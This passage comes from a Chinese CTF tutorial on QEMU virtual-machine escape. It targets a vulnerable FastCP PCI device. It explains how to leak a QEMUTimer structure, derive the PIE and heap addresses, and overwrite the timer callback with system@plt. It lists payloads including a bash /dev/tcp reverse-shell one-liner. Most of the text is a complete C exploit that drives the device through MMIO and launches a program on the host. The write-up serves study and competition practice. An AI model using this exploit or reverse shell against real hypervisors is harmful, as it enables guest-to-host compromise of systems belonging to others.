cp_timer 的结构（QEMUTimer）：

    
    
    00000000 QEMUTimer       struc ; (sizeof=0x30, align=0x8, copyof_1182)
    00000000                                         ; XREF: FastCPState/r
    00000000 expire_time     dq ?
    00000008 timer_list      dq ?                    ; offset
    00000010 cb              dq ?                    ; offset
    00000018 opaque          dq ?                    ; offset
    00000020 next            dq ?                    ; offset
    00000028 attributes      dd ?
    0000002C scale           dd ?
    00000030 QEMUTimer       ends
    

想用成功利用，需要分成两步：

  * 通过溢出的读取，泄露 cp_timer 结构体，其中存在 PIE 基址（计算出 system[@plt](https://github.com/plt "@plt") 的地址）和堆地址（整个结构的位置在堆上，计算出结构的开始位置，才能得到我们写入 system 参数的位置）。
  * 通过溢出的写入，覆盖 cp_timer 结构体控制程序执行流

触发时钟可以利用两种方式：

  * 虚拟机重启或关机的时候会触发时钟，调用 cb(opaque)
  * 在 MMOI WRITE 中可以触发时钟

system 执行内容：

  * cat /flag
  * 反弹 shell，/bin/bash -c ‘bash -i >& /dev/tcp/ip/port 0>&1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。
  * 弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。

注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap
申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000
的物理地址复制），需要额外的注意。

###  2.4 EXP

    
    
    #include <assert.h>
    #include <fcntl.h>
    #include <inttypes.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    #include <sys/io.h>
    #include <unistd.h>
    
    
    #define PAGE_SHIFT 12
    #define PAGE_SIZE (1 << PAGE_SHIFT)
    #define PFN_PRESENT (1ull << 63)
    #define PFN_PFN ((1ull << 55) - 1)
    char* userbuf;
    uint64_t phy_userbuf, phy_userbuf2;
    unsigned char* mmio_mem;
    
    struct FastCP_CP_INFO
    {
        uint64_t CP_src;
        uint64_t CP_cnt;
        uint64_t CP_dst;
    };
    
    struct QEMUTimer
    {
        int64_t expire_time;
        int64_t timer_list;
        int64_t cb;
        void* opaque;
        int64_t next;
        int attributes;
        int scale;
        char shell[0x50];
    };
    
    void die(const char* msg)
    {
        perror(msg);
        exit(-1);
    }
    
    uint64_t page_offset(uint64_t addr)
    {
        return addr & ((1 << PAGE_SHIFT) - 1);
    }
    
    uint64_t gva_to_gfn(void* addr)
    {
        uint64_t pme, gfn;
        size_t offset;
    
        int fd = open("/proc/self/pagemap", O_RDONLY);
        if (fd < 0)
        {
            die("open pagemap");
        }
        offset = ((uintptr_t)addr >> 9) & ~7;
        lseek(fd, offset, SEEK_SET);
        read(fd, &pme, 8);
        if (!(pme & PFN_PRESENT))
            return -1;
        gfn = pme & PFN_PFN;
        return gfn;
    }
    
    uint64_t gva_to_gpa(void* addr)
    {
        uint64_t gfn = gva_to_gfn(addr);
        assert(gfn != -1);
        return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
    }
    
    void mmio_write(uint64_t addr, uint64_t value)
    {
        *((uint64_t*)(mmio_mem + addr)) = value;
    }
    
    uint64_t mmio_read(uint64_t addr)
    {
        return *((uint64_t*)(mmio_mem + addr));
    }
    
    void fastcp_set_list_src(uint64_t list_addr)
    {
        mmio_write(0x8, list_addr);
    }
    
    void fastcp_set_cnt(uint64_t cnt)
    {
        mmio_write(0x10, cnt);
    }
    
    void fastcp_do_cmd(uint64_t cmd)
    {
        mmio_write(0x18, cmd);
    }
    
    void fastcp_do_readfrombuffer(uint64_t addr, uint64_t len)
    {
        struct FastCP_CP_INFO info;
        info.CP_cnt = len;
        info.CP_src = NULL;
        info.CP_dst = addr;
        memcpy(userbuf, &info, sizeof(info));
        fastcp_set_cnt(1);
        fastcp_set_list_src(phy_userbuf);
        fastcp_do_cmd(4);
        sleep(1);
    }
    
    void fastcp_do_writetobuffer(uint64_t addr, uint64_t len)
    {
        struct FastCP_CP_INFO info;
        info.CP_cnt = len;
        info.CP_src = addr;
        info.CP_dst = NULL;
        memcpy(userbuf, &info, sizeof(info));
        fastcp_set_cnt(1);
        fastcp_set_list_src(phy_userbuf);
        fastcp_do_cmd(2);
        sleep(1);
    }
    
    void fastcp_do_movebuffer(uint64_t srcaddr, uint64_t dstaddr, uint64_t len)
    {
        struct FastCP_CP_INFO info[0x11];
        for (int i = 0; i < 0x11; i++)
        {
            info[i].CP_cnt = len;
            info[i].CP_src = srcaddr;
            info[i].CP_dst = dstaddr;
        }
        memcpy(userbuf, &info, sizeof(info));
        fastcp_set_cnt(0x11);
        fastcp_set_list_src(phy_userbuf);
        fastcp_do_cmd(1);
        sleep(1);
    }
    
    
    int main(int argc, char* argv[])
    {
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
        if (mmio_fd == -1)
            die("mmio_fd open failed");
    
        mmio_mem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if (mmio_mem == MAP_FAILED)
            die("mmap mmio_mem failed");
    
        printf("mmio_mem: %p\n", mmio_mem);
    
        userbuf = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (userbuf == MAP_FAILED)
            die("mmap userbuf failed");
        mlock(userbuf, 0x10000);
        phy_userbuf = gva_to_gpa(userbuf);
        printf("user buff virtual address: %p\n", userbuf);
        printf("user buff physical address: %p\n", (void*)phy_userbuf);
    
        fastcp_do_readfrombuffer(phy_userbuf, 0x1030);
        fastcp_do_writetobuffer(phy_userbuf + 0x1000, 0x30);
        fastcp_do_readfrombuffer(phy_userbuf, 0x30);
    
        uint64_t leak_timer = *(uint64_t*)(&userbuf[0x10]);
        printf("leaking timer: %p\n", (void*)leak_timer);
        fastcp_set_cnt(1);
        uint64_t pie_base = leak_timer - 0x4dce80;
        printf("pie_base: %p\n", (void*)pie_base);
        uint64_t system_plt = pie_base + 0x2C2180;
        printf("system_plt: %p\n", (void*)system_plt);
    
        uint64_t struct_head = *(uint64_t*)(&userbuf[0x18]);
    
        struct QEMUTimer timer;
        memset(&timer, 0, sizeof(timer));
        timer.expire_time = 0xffffffffffffffff;
        timer.timer_list = *(uint64_t*)(&userbuf[0x8]);
        timer.cb = system_plt;
        timer.opaque = struct_head + 0xa00 + 0x1000 + 0x30;
        strcpy(&timer.shell, "gnome-calculator");
        memcpy(userbuf + 0x1000, &timer, sizeof(timer));
        fastcp_do_movebuffer(gva_to_gpa(userbuf + 0x1000) - 0x1000, gva_to_gpa(userbuf + 0x1000) - 0x1000, 0x1000 + sizeof(timer));
        fastcp_do_cmd(1);
    
        return 0;
    }
    

**执行 EXP 后成功在主机中弹出计算器**

![](https://p5.ssl.qhimg.com/t0110e12c1e53e237fe.png)

## 03 结语

感谢你的耐心阅读，如果前文中的内容都细看了，那么我相信应该对 QEMU、PCI 设备以及 QEMU 逃逸的过程已经有一个比较深入理解了。

这篇作为 QEMU 逃逸初探文章的第一篇，主要是介绍了 QEMU
的基础知识。但是学习过程只有理论而脱离实践是无法真正学习到知识的，之后的几篇内容都会以实战题目为主要内容来逐步的学习 QEMU
逃逸，也希望读者可以跟着文章中的介绍来动手操作一番。

同时，因为作者的水平有限，我也是在写文章的过程中去学习，文章中的很多代码和图片都来源于参考资料中，虽然我已经尽力的查阅大量的资料去检验内容的正确性，但是很难保证在文章中不出现错误。其中存在着一些主观的理解，这些理解的正确性还需要在之后的实践中来验证。这一点希望读者谅解，也希望发现错误的读者能够在评论区告知我以便修正。

## 04 参考资料

[1] [qemu 逃逸学习笔记](https://blog.csdn.net/qq_31457355/article/details/117170589)

[2] [qemu-pwn-基础知识](https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge)

[3] [[QWB2021 Quals] – EzQtest](https://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/)

[4] [VM escape – QEMU Case Study](http://www.phrack.org/papers/vm-escape-qemu-case-study.html)

[5] [pagemap, from the userspace
perspective](https://www.kernel.org/doc/Documentation/vm/pagemap.txt)

[6] [QEMU 如何虚拟 PCI
设备](https://blog.csdn.net/weixin_43780260/article/details/104410063)

[7] [PCI configuration
space](https://en.wikipedia.org/wiki/PCI_configuration_space)

[8] [What is the difference between an I/O mapped I/O, and a memory mapped I/O
in the interfacing of the microprocessor?](https://www.quora.com/What-is-the-difference-between-an-I-O-mapped-I-O-and-a-memory-mapped-I-O-in-the-interfacing-of-the-microprocessor)

[9] [Github GiantVM pci.md](https://github.com/GiantVM/doc/blob/master/pci.md)

[10] [BlizzardCTF 2017 –
Strng](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)

[11] [qemu-pwn 强网杯 2019 两道 qemu 逃逸题 writeup](https://ray-cp.github.io/archivers/qemu-pwn-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E4%B8%A4%E9%81%93qemu%E9%80%83%E9%80%B8%E9%A2%98writeup)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wjh** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/254906](/post/id/254906)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [QEMU](/tag/QEMU)
  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __10赞

 __收藏

![](https://p4.ssl.qhimg.com/t0162586615c462960c.png) wjh

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

